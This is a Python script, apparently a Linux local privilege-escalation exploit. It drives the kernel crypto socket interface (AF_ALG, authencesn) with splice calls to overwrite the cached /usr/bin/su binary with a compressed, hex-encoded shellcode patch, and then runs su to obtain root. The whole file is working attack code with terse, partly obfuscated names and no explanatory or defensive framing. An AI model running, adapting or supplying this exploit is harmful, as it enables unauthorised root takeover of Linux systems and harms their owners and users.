#!/usr/bin/python
import os as g
import zlib
import socket as s
import ctypes

# --- Define the Linux splice system call using ctypes ---
libc = ctypes.CDLL("libc.so.6", use_errno=True)

def splice(fd_in, off_in, fd_out, off_out, length, flags):
    # ssize_t splice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out, size_t len, unsigned int flags);
    res = libc.splice(
        ctypes.c_int(fd_in),
        ctypes.byref(ctypes.c_longlong(off_in)) if off_in is not None else None,
        ctypes.c_int(fd_out),
        ctypes.byref(ctypes.c_longlong(off_out)) if off_out is not None else None,
        ctypes.c_size_t(length),
        ctypes.c_uint(flags)
    )
    if res == -1:
        errno = ctypes.get_errno()
        raise OSError(errno, g.strerror(errno))
    return res

def d(x): 
    return bytes.fromhex(x)

def c(f_fd, t, payload_chunk):
    # AF_ALG = 38, SOCK_SEQPACKET = 5
    a = s.socket(38, 5, 0)
    # AEAD algorithm setup
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    
    h = 279  # SOL_ALG
    v = a.setsockopt
    
    # ALG_SET_KEY
    v(h, 1, d('0800010000000010' + '0' * 64))
    # ALG_SET_AEAD_AUTHSIZE
    v(h, 5, None, 4)
    
    u, _ = a.accept()
    o = t + 4
    i = d('00')
    
    # Send control messages for AEAD
    u.sendmsg(
        [b"A" * 4 + payload_chunk], 
        [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)], 
        32768
    )
    
    # Create pipe for splicing
    r, w = g.pipe()
    
    try:
        # Splice from source file to pipe
        splice(f_fd, 0, w, None, o, 0)
        # Splice from pipe to socket
        splice(r, None, u.fileno(), None, o, 0)
        
        # Trigger the processing
        u.recv(8 + t)
    except Exception:
        pass
    finally:
        g.close(r)
        g.close(w)
        u.close()
        a.close()

# --- Main Execution ---

# Open /usr/bin/su - returns an integer file descriptor
f = g.open("/usr/bin/su", g.O_RDONLY)

# Decompressed payload (Shellcode/Binary patch)
e = zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))

i = 0
while i < len(e):
    # Pass 'f' directly as it is already an integer FD
    c(f, i, e[i:i+4])
    i += 4

g.close(f)

# Execute the modified/triggered su
g.system("su")
